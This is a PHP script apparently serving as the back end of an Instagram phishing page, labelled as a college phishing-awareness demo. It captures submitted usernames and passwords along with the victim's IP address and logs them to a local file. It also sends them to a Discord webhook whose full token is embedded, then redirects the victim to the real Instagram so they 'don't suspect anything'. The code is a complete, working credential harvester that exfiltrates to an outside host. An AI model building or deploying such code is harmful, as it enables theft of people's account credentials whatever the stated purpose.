<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sanitized_username = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
    $sanitized_password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');

    // Log locally
    $log_file = 'captured_data.txt';
    $log_data = "Username: " . $sanitized_username . "\nPassword: " . $sanitized_password . "\nTime: " . date('Y-m-d H:i:s') . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\n\n";
    file_put_contents($log_file, $log_data, FILE_APPEND);

    // Send to Discord webhook
    $webhook_url = "https://discord.com/api/webhooks/1539956613941567561/tYCT2juxxugTWjJGrJe6GamHI1xpy683pAE34JyTpAIPqknchLzCYz1bWpJoQ89XwzXI";

    $embed = [
        "embeds" => [
            [
                "title" => "Phishing Demo - Captured Credentials",
                "color" => 16711680,
                "fields" => [
                    ["name" => "Username", "value" => "```" . $sanitized_username . "```", "inline" => false],
                    ["name" => "Password", "value" => "```" . $sanitized_password . "```", "inline" => false],
                    ["name" => "IP Address", "value" => $_SERVER['REMOTE_ADDR'], "inline" => true],
                    ["name" => "Time", "value" => date('Y-m-d H:i:s'), "inline" => true]
                ],
                "footer" => ["text" => "Phishing Awareness Demo - College Project"]
            ]
        ]
    ];

    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($embed));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_exec($ch);
    curl_close($ch);

    // Redirect to real Instagram so victim doesn't suspect anything
    header("Location: https://www.instagram.com/");
    exit();
} else {
    echo "<p>Invalid request method.</p>";
}
?>
